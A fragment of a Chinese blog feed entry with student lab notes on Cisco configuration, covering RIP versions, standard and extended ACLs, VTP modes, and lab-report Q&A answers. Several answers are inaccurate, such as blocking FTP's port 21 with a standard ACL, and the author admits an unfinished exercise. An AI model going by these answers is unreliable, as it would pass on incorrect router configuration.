start="4"><li><p>如果两台路由器一台运行RIP第1版，一台运行第2版，两台主机是否可以ping通？通过使用show ip route 查看两台路由器的路由表，确定版本1与版本2之间究竟谁可以接受谁的路由更新？（单边邻居关系）</p><blockquote><p style="color:blue;">两台主机不能ping通，RIP版本1可以接受版本2，因为RIPv2需要包含子网掩码，而版本1并不含有子网掩码，版本1的协议发往版本2后，版本2会将该报文丢弃，而当版本1接受到版本2的报文时，版本1会收下版本2的报文</p></blockquote></li></ol><h4 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h4><pre class="line-numbers language-、" data-language="、"><code class="language-、">access-list[list number][permit&#x2F;deny][source address][address][wildcard mask][log]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>标准ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> deny host <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.2</span><span class="token comment"># 拒绝来自1.1.1.2的主机通过</span><span class="token comment"># 可以利用关键字"host"来代表通配符掩码0.0.0.0,表示一台主机</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">1</span> permit <span class="token builtin">any</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">1</span> out<span class="token comment"># 访问列表的出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>拓展ACL</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> deny tcp <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> <span class="token number">2.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> eq telnet<span class="token comment"># telnet使用的是TCP的23号端口、eq其实是等于....</span>Access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">101</span> permit tcp <span class="token builtin">any</span> <span class="token builtin">any</span><span class="token comment"># 这两条语句的顺序;访问表语句的处理顺序是由上到下的。如果我们将两个语句顺序颠倒，将permit语句放在deny语句的前面，则我们将不能过滤来自主机地址的报文</span>Interface f0<span class="token operator">/</span><span class="token number">0</span>Ip access<span class="token operator">-</span>group <span class="token number">101</span> <span class="token keyword">in</span><span class="token comment">#访问控制列表 出</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>根据本次实验，你认为ACL一般有哪些配置步骤？</p><p><strong><del>跟上面那个动态路由一样，我没弄出来</del></strong></p></li><li><p>在步骤4中，如果要使得1.0.0.0整个网络无法访问2.0.0.0该如何配置？</p><ul><li>可以使用Access-list 1 deny 指令阻止整个网段的访问</li></ul></li><li><p>在步骤5中，虽然禁止的是telnet，但此时PC1是否可以ping通PC2?为达到ping通的目的，应该如何处理？</p><ul><li>ping 命令通过ICMP协议进行报文传输，在访问控制类别中没有运行ICMP或者IP报文的访问，所以ping指令也无法通信。</li></ul></li><li><p>禁止FTP应该如何配置访问控制列表？</p><ul><li>通过access-list 1 deny命令禁止代表FTP协议的21号端口即可禁止FTP</li></ul></li></ol><h4 id="VTP"><a href="#VTP" class="headerlink" title="VTP"></a>VTP</h4><p><strong>配置级联接口的Trunk封装</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">switchport trunk encapsulation dot1q<span class="token comment">#接口的trunk封装802.1Q协议，用于启用trunk</span>switchport mode trunk<span class="token comment">#设置接口模式为trunk模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置交换机的工作模式</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">vtp mode <span class="token punctuation">[</span>server<span class="token operator">/</span>client<span class="token operator">/</span>transparent<span class="token punctuation">]</span> <span class="token comment">#分别是服务器，客户端和透明模式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>VTP服务器控制着它们所在域中VALN的生成和修改</li><li>VTP客户机不允许管理员创建、修改或删除VLAN。它们监听本域中其他交换机的VTP通告，并相应修改它们的VTP配置情况</li><li>VTP透明模式中的交换机不参与VTP，交换机处于透明模式时，不通告其VLAN配置信息。它的VLAN数据库更新与收到的通告也不保持同步。可以创建和删除本地的VLAN。这些VLAN的变更不会传播到其他任何交换机上</li></ul><p><strong>更改交换机的域名</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch (config)# vtp domain qrnu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>如果将S2的工作模式更改为透明模式，S2是否会学习S1的VLAN划分？<ul><li>不会，透明模式不会学习服务器的配置</li></ul></li></ol><h3 id="押题："><a href="#押题：" class="headerlink" title="押题："></a>押题：</h3><h4 id="三层交换实现VLAN间通信-https-blog-csdn-net-weixin-47678542-article-details-121749703"><a href="#三层交换实现VLAN间通信-https-blog-csdn-net-weixin-47678542-article-details-121749703" class="headerlink" title="[三层交换实现VLAN间通信][https://blog.csdn.net/weixin_47678542/article/details/121749703]"></a>[三层交换实现VLAN间通信][<a href="https://blog.csdn.net/weixin_47678542/article/details/121749703]">https://blog.csdn.net/weixin_47678542/article/details/121749703]</a></h4><p>[路由器实现Vlan间通信][<a href="https://blog.csdn.net/weixin_47678542/article/details/121844112]">https://blog.csdn.net/weixin_47678542/article/details/121844112]</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;网络工程——CISCO设备基本语法&quot;&gt;&lt;a href=&quot;#网络工程——CISCO设备基本语法&quot; class=&quot;headerlink&quot; title=&quot;网络工程——CISCO设备基本语法&quot;&gt;&lt;/a&gt;网络工程——CISCO设备基本语法&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="Cisco" scheme="https://shierjinghuang.github.io/tags/Cisco/"/>
    
  </entry>
  
</feed>
